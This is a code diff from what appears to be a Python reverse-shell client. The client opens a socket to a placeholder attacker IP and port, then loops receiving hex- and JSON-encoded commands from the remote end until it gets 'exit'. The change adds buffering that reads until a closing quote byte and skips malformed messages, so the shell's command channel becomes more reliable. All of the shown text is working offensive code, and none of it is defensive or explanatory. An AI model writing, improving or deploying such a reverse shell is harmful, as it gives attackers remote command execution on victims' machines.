@@ -29,7 +29,20 @@ rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 rev_socket.connect(('IP', PORT)) # Set IP and port on this line.
 
 while True:
-    command = hex_handler(rev_socket.recv(1024), decode=True)
+    command = b''
+    while True:
+        try:
+            command = command + rev_socket.recv(1024)
+            if not command:
+                break
+            if command[-1] == 34:
+                break
+        except ValueError:
+            continue
+    try:
+        command = hex_handler(command, decode=True)
+    except json.decoder.JSONDecodeError:
+        continue
 
     if command == 'exit':
         rev_socket.close()
